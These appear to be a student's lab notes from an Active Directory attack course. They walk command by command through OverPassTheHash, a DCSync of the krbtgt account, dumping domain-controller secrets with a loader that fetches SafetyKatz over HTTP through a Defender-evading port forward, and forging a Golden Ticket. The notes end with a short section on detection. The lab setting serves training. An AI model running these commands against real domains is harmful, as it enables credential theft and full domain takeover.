- Extract secrets from the domain controller of `dollarcorp`.
	- Recall that we already have access to the DA (`svcadmin`) hash.
	- So, we will first start a process using OverPassTheHash:
		- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<svcadmin's AES key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
	- Next, we can either run the DCSync attack, or dump credentials from the DC.
		- DCSync:
			- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"`
			- We now get the NTLM hash, the AES-256 key and the AES-128 key for the krbtgt account, we should always prefer to use the AES-256 key for OPSEC reasons.
			- We can also observe that the password for the krbtgt account hasn't been changed in years, since it doesn't change automatically.
		- Extracting credentials from the DC:
			- Copying `Loader.exe` to the DC.
				- `echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y`
			- Connecting to the DC:
				- `winrs -r:dcorp-dc cmd`
			- Setting up port-forwarding to evade detection by Defender.
				- `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
			- Next, we need to setup HFS on the student VM , since we need to later use it while downloading and executing `SafetyKatz` on the DC:
				- `C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump:evasive-lsa /patch" "exit"`
				- Here we will now have all the secrets of the domain, including the NTLM hash/RC4 of the krbtgt account.
				- If we really want the AES key, we need to perform a DCSync attack.
- Using the secrets of krbtgt account, create a Golden ticket.
	- Back on the student VM, we can now use Rubeus to forge the Golden Ticket.
		- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:<AES key of the krbtgt account> /sid:<sid of the current domain> /ldap /user:Administrator /printcmd`
		- If you want to understand the components of this command in more detail, please refer to the previous note, "27 - Golden Ticket".
		- Executing the command gives us a verbose output detailing the tool's actions, along with providing a command that we can use to actually create the Golden Ticket.
			- The only two changes we will make to the command is to:
				1. Execute it using Loader.
				2. Add the `/ptt` option, since we want to inject the ticket in the current session.
			- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args <the command provided by Rubeus in the output of the previous command we just executed> /ptt`
	- After all this is successfully done, the ticket gets imported and we can actually go ahead and connect to the DC using this ticket.
		- `winrs -r:dcorp-dc cmd`
			- `set username`
				- We can observe that our username here would be "Administrator", suggesting that we are accessing the DC as the default administrator (RID 500) account.
			- `set computername`
				- `Should output the DC's hostname`
- Use the Golden ticket to (once again) get domain admin privileges from a machine.
	- After all this is successfully done, the ticket gets imported and we can actually go ahead and connect to the DC using this ticket.
		- `winrs -r:dcorp-dc cmd`
			- `set username`
				- We can observe that our username here would be "Administrator", suggesting that we are accessing the DC as the default administrator (RID 500) account.
			- `set computername`
				- `Should output the DC's hostname`

#### Note on Golden Ticket Detection
- Golden Ticket Attacks are not hard to detect.
- There are two chances of detection during the attack:
	1. During the extraction of the krbtgt secrets, because it requires access as a DA, or any other high privilege account.
	2. Even if we evade detection during the extraction of the krbtgt secrets, some time later, when we try to forge a ticket and access domain resources using it as a DA, e may face detection if we target a DA, since that is a very high privilege account.
		- Also, the DA logging in to the DC from a new machine, especially a non DC machine, is going to trigger alerts, if it does not, it should.